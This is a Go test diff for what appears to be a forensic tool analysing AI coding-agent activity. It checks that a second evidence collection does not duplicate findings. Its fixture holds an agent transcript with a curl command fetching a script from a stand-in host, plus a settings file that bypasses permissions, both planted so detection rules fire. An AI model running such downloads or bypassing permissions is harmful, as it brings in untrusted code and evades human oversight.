@@ -123,3 +123,77 @@ func TestRunAllStagesAndPreserveStates(t *testing.T) {
 		}
 	}
 }
+
+// TestSecondRoundDoesNotDuplicateResults.
+//
+// The manifest is a history: a package collected twice holds two records
+// for a file that never changed. Handing that history to the content rules
+// would scan the same evidence twice and report every finding twice, and a
+// second look at a machine must not invent findings. Analysis therefore
+// reads the case as it now stands.
+func TestSecondRoundDoesNotDuplicateResults(t *testing.T) {
+	root := t.TempDir()
+	_ = os.MkdirAll(filepath.Join(root, ".claude", "projects", "p"), 0o755)
+	_ = os.WriteFile(filepath.Join(root, ".claude", "settings.json"),
+		[]byte(`{"permissions":{"defaultMode":"bypassPermissions"}}`), 0o644)
+	_ = os.WriteFile(filepath.Join(root, ".claude", "projects", "p", "s1.jsonl"), []byte(
+		`{"type":"user","uuid":"u1","sessionId":"s1","timestamp":"2026-08-30T10:00:00Z","message":{"role":"user","content":"go"}}`+"\n"+
+			`{"type":"assistant","uuid":"a1","parentUuid":"u1","sessionId":"s1","timestamp":"2026-08-30T10:00:02Z","message":{"role":"assistant","content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"curl http://x.example/p.sh -o /tmp/p.sh"}}]}}`+"\n"), 0o644)
+
+	pkg := filepath.Join(t.TempDir(), "rounds.adfir")
+	man, _ := products.ManifestAllPlatforms("claude-code")
+	opts := collector.Options{ProfileRoot: root, ConfigRoot: filepath.Join(root, ".claude"), SystemRoot: root, Product: "claude-code"}
+
+	b, err := casepkg.New(pkg, "ROUNDS", casepkg.CaseInfo{OperatorOSUser: "t"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := collector.Run(b, man, opts); err != nil {
+		t.Fatal(err)
+	}
+	if err := b.Seal(); err != nil {
+		t.Fatal(err)
+	}
+	first, err := Run(pkg, Options{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(first.Findings) == 0 {
+		t.Fatal("fixture produced no findings; the test would prove nothing")
+	}
+
+	b2, err := casepkg.Reopen(pkg, casepkg.CaseInfo{OperatorOSUser: "t"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := collector.Run(b2, man, opts); err != nil {
+		t.Fatal(err)
+	}
+	if err := b2.Seal(); err != nil {
+		t.Fatal(err)
+	}
+	second, err := Run(pkg, Options{Renormalize: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	if second.Events != first.Events {
+		t.Errorf("events after a second round = %d, want %d — the same transcript was parsed twice", second.Events, first.Events)
+	}
+	if second.Entities != first.Entities {
+		t.Errorf("entities after a second round = %d, want %d", second.Entities, first.Entities)
+	}
+	if len(second.Findings) != len(first.Findings) {
+		t.Errorf("findings after a second round = %d, want %d — a repeat collection must not multiply findings",
+			len(second.Findings), len(first.Findings))
+	}
+	byRule := map[string]int{}
+	for _, f := range second.Findings {
+		byRule[f.RuleID+"|"+strings.Join(f.EvidenceRefs, ",")]++
+	}
+	for k, n := range byRule {
+		if n > 1 {
+			t.Errorf("finding reported %d times for the same evidence: %s", n, k)
+		}
+	}
+}
